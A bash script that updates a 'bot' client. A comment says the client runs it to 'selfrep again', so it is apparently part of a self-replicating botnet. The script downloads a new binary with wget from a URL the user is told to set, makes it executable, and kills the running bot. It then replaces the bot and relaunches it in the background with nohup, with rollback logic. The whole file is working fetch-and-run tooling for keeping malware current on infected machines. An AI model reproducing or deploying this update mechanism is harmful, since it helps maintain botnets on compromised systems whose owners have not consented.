#!/bin/bash

# Enhanced Bot Update Script with Atomic Operations
# Basically a Update file for the Client to run to selfrep again
# Usage: ./update.sh /path/to/current/bot

# Configuration
CURRENT_BOT="$1"
BOT_DIR=$(dirname "$CURRENT_BOT")
BOT_NAME=$(basename "$CURRENT_BOT")
NEW_BOT="$BOT_NAME.new"
BACKUP_BOT="$BOT_NAME.bak"
UPDATE_LOG="/var/log/bot_update.log"
DOWNLOAD_URL="http://localhost:8000/bot"  # Change to your actual download URL
MAX_RETRIES=5
RETRY_DELAY=3
TIMEOUT=30

# Ensure we're running as root if needed
if [ "$(id -u)" -ne 0 ]; then
    echo "This script may require root privileges for certain operations" >&2
fi

# Enhanced logging function
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$UPDATE_LOG"
}

# Verify dependencies
verify_dependencies() {
    local missing=()
    for cmd in wget pgrep pkill nohup chmod; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            missing+=("$cmd")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        log "Error: Missing required commands: ${missing[*]}"
        exit 1
    fi
}

# Verify we got the current bot path
if [ -z "$CURRENT_BOT" ] || [ ! -f "$CURRENT_BOT" ]; then
    log "Error: Please provide a valid current bot path as argument"
    exit 1
fi

# Check disk space (minimum 10MB required)
check_disk_space() {
    local available_space=$(df -P "$BOT_DIR" | awk 'NR==2 {print $4}')
    if [ "$available_space" -lt 10240 ]; then
        log "Error: Insufficient disk space (need at least 10MB free)"
        exit 1
    fi
}

# Download with retries and timeout
download_file() {
    local url=$1
    local output=$2
    local retries=0
    
    while [ $retries -lt "$MAX_RETRIES" ]; do
        if wget --timeout="$TIMEOUT" --tries=1 "$url" -O "$output" 2>>"$UPDATE_LOG"; then
            return 0
        fi
        retries=$((retries + 1))
        log "Download attempt $retries of $MAX_RETRIES failed, retrying in $RETRY_DELAY seconds..."
        sleep "$RETRY_DELAY"
    done
    return 1
}

# Main update process
main() {
    log "=== Starting Bot Update ==="
    log "Current bot: $CURRENT_BOT (Version: $("$CURRENT_BOT" --version 2>/dev/null || echo "unknown"))"
    
    verify_dependencies
    check_disk_space
    
    # 1. Download new version with retries
    log "Downloading new version from $DOWNLOAD_URL..."
    if ! download_file "$DOWNLOAD_URL" "$NEW_BOT"; then
        log "Error: Failed to download new version after $MAX_RETRIES attempts"
        exit 1
    fi
    
    # Make new binary executable
    if ! chmod 750 "$NEW_BOT"; then
        log "Error: Failed to set permissions on new binary"
        exit 1
    fi
    
    # 2. Verify the new binary
    log "Verifying new binary..."
    if ! "$NEW_BOT" --version &>>"$UPDATE_LOG"; then
        log "Error: New binary verification failed (invalid binary)"
        rm -f "$NEW_BOT"
        exit 1
    fi
    
    # 3. Stop current bot gracefully
    log "Stopping current bot..."
    pkill -f "$(basename "$CURRENT_BOT")"
    
    # Wait for shutdown with timeout
    local wait_time=0
    while pgrep -f "$(basename "$CURRENT_BOT")" >/dev/null && [ $wait_time -lt 10 ]; do
        sleep 1
        wait_time=$((wait_time + 1))
    done
    
    # Force kill if still running
    if pgrep -f "$(basename "$CURRENT_BOT")" >/dev/null; then
        log "Warning: Force killing bot process"
        pkill -9 -f "$(basename "$CURRENT_BOT")"
        sleep 1
    fi
    
    # 4. Create backup using atomic operation
    log "Creating backup..."
    if cp -f "$CURRENT_BOT" "$BACKUP_BOT"; then
        sync
    else
        log "Warning: Failed to create backup"
    fi
    
    # 5. Install new version using atomic operation
    log "Installing new version..."
    if mv -f "$NEW_BOT" "$CURRENT_BOT"; then
        sync
    else
        log "Error: Failed to install new version"
        # Attempt to restore from backup
        if [ -f "$BACKUP_BOT" ]; then
            log "Attempting to restore from backup..."
            mv -f "$BACKUP_BOT" "$CURRENT_BOT"
            sync
        fi
        exit 1
    fi
    
    # 6. Restart bot with proper working directory
    log "Restarting bot..."
    cd "$BOT_DIR" || exit 1
    nohup "./$BOT_NAME" >>"$UPDATE_LOG" 2>&1 &
    
    # Verify the bot is running
    sleep 2
    if ! pgrep -f "$(basename "$CURRENT_BOT")" >/dev/null; then
        log "Error: Bot failed to start after update"
        # Attempt to restore from backup and restart
        if [ -f "$BACKUP_BOT" ]; then
            log "Attempting to restore from backup and restart..."
            mv -f "$BACKUP_BOT" "$CURRENT_BOT"
            nohup "./$BOT_NAME" >>"$UPDATE_LOG" 2>&1 &
            sleep 2
            if pgrep -f "$(basename "$CURRENT_BOT")" >/dev/null; then
                log "Successfully restored and started backup version"
                exit 1
            fi
        fi
        log "Critical: Unable to start bot after update attempt"
        exit 1
    fi
    
    log "New version running: $("$CURRENT_BOT" --version 2>/dev/null || echo "unknown")"
    log "=== Update Completed Successfully ==="
    exit 0
}

main
